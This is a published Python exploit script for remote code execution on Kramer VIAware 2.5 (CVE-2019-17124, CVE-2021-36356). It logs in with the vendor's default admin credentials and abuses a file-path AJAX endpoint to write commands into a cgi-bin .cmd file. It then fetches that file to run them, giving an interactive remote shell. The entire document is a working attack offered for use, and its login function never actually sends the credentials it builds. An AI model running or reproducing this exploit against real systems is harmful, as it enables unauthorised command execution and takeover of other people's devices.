# Exploit Title: Remote Code Execution KRAMER VIAware
# Date: 24/03/2022
# Exploit Author: sharkmoos & BallO
# Vendor Homepage: https://www.kramerav.com/
# Software Link: https://www.kramerav.com/us/product/viaware
# Version: 2.5.0719.1034
# Tested on: ViaWare Go (Windows 10)
# CVE : CVE-2019-17124, CVE-2021-36356
import requests, sys, urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def adminLogin(s, host, username, password):
    headers = {
        "Host": f"{host}",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "en-GB,en;q=0.5",
        "Accept-Encoding": "gzip, deflate",
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": f"https://{host}",
        "Referer": f"https://{host}/admin/login.php",
        "Upgrade-Insecure-Requests": "1",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-User": "?1",
        "Sec-Gpc": "1",
        "Te": "trailers",
        "Connection": "close"
        }
    data = {
        "txtUserId": username,
        "txtPwd": password,
        "btnOk" :"Login"
        }
    response = s.post(f"https://{host}/admin/login.php", verify=False)
    if len(s.cookies) < 1:
        return False
    else:
        return True


def writeCommand(session, host, command):
    headers = {
    "Host": f"{host}",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0",
    "Accept": "text/html, */*",
    "Accept-Language": "en-GB,en;q=0.5",
    "Accept-Encoding": "gzip, deflate",
    "Content-Type": "application/x-www-form-urlencoded",
    "X-Requested-With": "XMLHttpRequest",
    "Origin": f"https://{host}",
    "Referer": f"https://{host}/browseSystemFiles.php?path=C:\Windows&icon=browser",
    "Sec-Fetch-Dest": "empty",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Gpc": "1",
    "Te": "trailers",
    "Connection": "close"
    }
    data = {
        "radioBtnVal":f"{command}",
        "associateFileName": "C:/tc/httpd/cgi-bin/exploit.cmd"
        }
    session.post(f"https://{host}/ajaxPages/writeBrowseFilePathAjax.php", headers=headers, data=data)


def getResult(session, host):
    file = session.get(f"https://{host}/cgi-bin/exploit.cmd", verify=False)
    pageText = file.text
    if len(pageText) < 1:
        result = "Command did not return a result"
    else:
        result = pageText
    return result

        

def main(host, username="su", password="supass"):
    s = requests.Session()
    # comment this line to skip the login stage    
    loggedIn = adminLogin(s, host, username, password)
    
    if not loggedIn:
        print("Could not successfully login as the admin")
        sys.exit(1)
    else:
        pass

    command = ""
    while command != "exit":
        command = input("cmd:> ").strip()
        writeCommand(s, host, command)
        print(getResult(s, host))
    exit()

if __name__ == "__main__":
    
    args = sys.argv
    numArgs = len(args)
    if  numArgs < 2:
        print(f"Run script in format:\n\n\tpython3 {args[0]} target\n")
        print(f"[Optional] Provide Admin Credentials\n\n\tpython3 {args[0]} target su supass")
    if numArgs == 2:
        main(args[1])
    if numArgs == 4:
        main(args[1], args[2], args[3])
    if numArgs > 4:
        print(f"Run script in format:\n\n\tpython3 {args[0]} target\n")
        print(f"[Optional] Provide Admin Credentials\n\n\tpython3 {args[0]} target su supass")
